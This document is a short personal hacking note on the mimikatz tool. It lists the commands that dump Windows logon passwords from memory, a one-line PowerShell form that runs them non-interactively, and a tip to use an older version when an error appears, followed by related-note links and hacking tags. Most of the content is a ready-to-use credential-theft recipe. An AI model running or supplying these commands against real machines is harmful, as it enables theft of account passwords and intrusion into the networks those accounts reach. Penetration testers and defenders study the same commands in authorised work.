# mimikatz

- dump passwords
```
privilege::debug
sekurlsa::logonpasswords
```

- all in one command for non-interactive powershell
```
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

- troubleshooting `ERROR kuhl_m_sekurlsa_acquireLSA Key import`
```
I tried an earlier version 2.1.1 #17763 and ran sekurlsa::logonpasswords just fine.
```
  - https://github.com/gentilkiwi/mimikatz/issues/248

` zet/20221003151089/README.md `

# Related

- <https://github.com/gentilkiwi/mimikatz/issues/248>
- [20221017180938](/zet/20221017180938/README.md) hacking or enumeration tool
- [20221014185704](/zet/20221014185704/README.md) kb file named kb/hacking/windows/mimikatz.md
- [20221003151088](/zet/20221003151088/README.md) mimikatz all in one command for non-interactive powershell
- [20221003151087](/zet/20221003151087/README.md) mimikatz dump passwords
- [20221003151086](/zet/20221003151086/README.md) mimikatz troubleshooting `ERROR kuhl_m_sekurlsa_acquireLSA Key import`
- ~/kb/hacking/windows/mimikatz.md

Tags:

    #hacking #windows #mimikatz #info
